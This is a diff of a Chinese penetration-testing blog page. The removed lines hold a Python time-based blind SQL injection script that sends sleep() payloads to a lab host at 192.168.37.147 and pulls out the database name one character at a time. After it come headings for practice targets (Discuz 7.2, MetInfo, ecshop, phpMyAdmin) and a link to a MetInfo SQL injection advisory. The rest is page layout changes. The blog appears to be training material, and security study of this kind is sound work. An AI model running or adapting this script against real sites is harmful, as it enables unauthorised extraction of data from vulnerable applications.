-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="comment">#时间盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'</span></span><br><span class="line"><span class="comment">#存放跑出的结果</span></span><br><span class="line">length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table=<span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start get length...'</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">	startTime1=time.time()</span><br><span class="line">	url1 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)"</span>%(l)</span><br><span class="line">	response1 = requests.get(url1)</span><br><span class="line">	<span class="keyword">if</span> time.time() - startTime1 &gt; <span class="number">5</span>:</span><br><span class="line">		length=l</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"the length is "</span> + str(length)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start database sql injection...'</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		startTime2=time.time()</span><br><span class="line">		url2 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)"</span>%(d,payload)</span><br><span class="line">		response2 = requests.get(url2) <span class="comment">#发送请求</span></span><br><span class="line">		<span class="keyword">if</span> time.time() - startTime2 &gt; <span class="number">5</span>: <span class="comment">#判断是否延时了5秒 也就是 是否执行了函数sleep(5)</span></span><br><span class="line">			database+=payload</span><br><span class="line">			<span class="keyword">print</span> database</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"the database is "</span> + database</span><br></pre></td></tr></table></figure>
-<h3 id="实战练习-DZ论坛"><a href="#实战练习-DZ论坛" class="headerlink" title="实战练习:DZ论坛"></a>实战练习:DZ论坛</h3><p>dz7.2</p>
-<h3 id="实战练习-aspcms"><a href="#实战练习-aspcms" class="headerlink" title="实战练习:aspcms"></a>实战练习:aspcms</h3><h3 id="实战练习-phpmyadmin"><a href="#实战练习-phpmyadmin" class="headerlink" title="实战练习:phpmyadmin"></a>实战练习:phpmyadmin</h3><h3 id="实战练习-齐博系统"><a href="#实战练习-齐博系统" class="headerlink" title="实战练习:齐博系统"></a>实战练习:齐博系统</h3><h3 id="实战练习-海盗云商"><a href="#实战练习-海盗云商" class="headerlink" title="实战练习:海盗云商"></a>实战练习:海盗云商</h3><h3 id="实战练习-PHP168-6-0"><a href="#实战练习-PHP168-6-0" class="headerlink" title="实战练习:PHP168 6.0"></a>实战练习:PHP168 6.0</h3><h3 id="实战练习-ecshop"><a href="#实战练习-ecshop" class="headerlink" title="实战练习:ecshop"></a>实战练习:ecshop</h3><h3 id="实战练习-ShopXp系统v3-x"><a href="#实战练习-ShopXp系统v3-x" class="headerlink" title="实战练习:ShopXp系统v3.x"></a>实战练习:ShopXp系统v3.x</h3><h3 id="实战练习-Dcore-轻型CMS系统"><a href="#实战练习-Dcore-轻型CMS系统" class="headerlink" title="实战练习:Dcore(轻型CMS系统)"></a>实战练习:Dcore(轻型CMS系统)</h3><h3 id="实战练习-MetInfo-5-1-7"><a href="#实战练习-MetInfo-5-1-7" class="headerlink" title="实战练习:MetInfo 5.1.7"></a>实战练习:MetInfo 5.1.7</h3><h3 id="实战练习-Metinfo-5-3"><a href="#实战练习-Metinfo-5-3" class="headerlink" title="实战练习:Metinfo 5.3"></a>实战练习:Metinfo 5.3</h3><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0119166" target="_blank" rel="noopener">MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞</a>:</p>
-<h2 id="实战扩展"><a href="#实战扩展" class="headerlink" title="实战扩展"></a>实战扩展</h2><h2 id="漏洞知识"><a href="#漏洞知识" class="headerlink" title="漏洞知识"></a>漏洞知识</h2>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
-  </nav>
-
+  </aside>
 </section>
         
       </div>
-      
-        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
       
       <footer id="footer">
   
@@ -1504,9 +552,9 @@
 <script src="/js/scripts.js"></script>
 
 
-  <script src="/js/home.js"></script>
 
 
+  <script src="/js/dialog.js"></script>
 
 
 
@@ -1591,6 +639,8 @@
   
   <a id="rocket" href="#top" class=""></a>
   <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
   
 </body>
 </html>
